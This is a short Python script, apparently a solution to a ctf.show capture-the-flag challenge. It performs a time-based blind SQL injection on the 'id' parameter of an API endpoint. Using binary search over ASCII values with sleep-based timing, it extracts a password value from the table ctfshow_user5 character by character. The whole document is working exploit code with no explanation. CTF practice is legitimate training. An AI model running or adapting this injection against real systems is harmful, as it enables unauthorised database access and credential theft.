import requests

url = "http://fe901778-d30a-444f-803e-526ef28c8e63.chall.ctf.show/api/v5.php?id=1' and "

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        payload = f'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))>{mid},sleep(2),0) -- -'
        try:
            r = requests.get(url + payload, timeout=0.5)
            tail = mid
            print(url + payload)
        except Exception as e:
            head = mid + 1

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)


